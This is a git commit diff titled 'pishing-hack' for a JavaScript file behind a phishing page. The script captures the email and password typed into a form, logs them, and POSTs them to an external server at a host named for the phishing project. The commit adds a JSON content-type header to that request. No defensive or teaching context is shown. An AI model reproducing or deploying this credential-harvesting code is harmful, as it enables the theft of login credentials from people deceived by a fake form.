48699e84fc7b822ce866bb4260e00aef72cc75c2
aaquinonez01 <aaquinonez280801@gmail.com>
2023-12-10 14:25:26 -0500

    pishing-hack

--- srcript.js
+++ srcript.js
@@ -3,10 +3,13 @@ document.querySelector("#form_hack").addEventListener("submit", (event) => {
 
     const username = document.getElementById("email").value;
     const password = document.getElementById("pass").value;
-
+    console.log(username, password)
     fetch("https://pishing-hack-project.onrender.com/api/v1/users", {
         method:"POST", 
-        body: JSON.stringify({username, password})
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username, password })
     }).then((resp)=>{
         resp.json().then((data)=>{
             console.log(data);
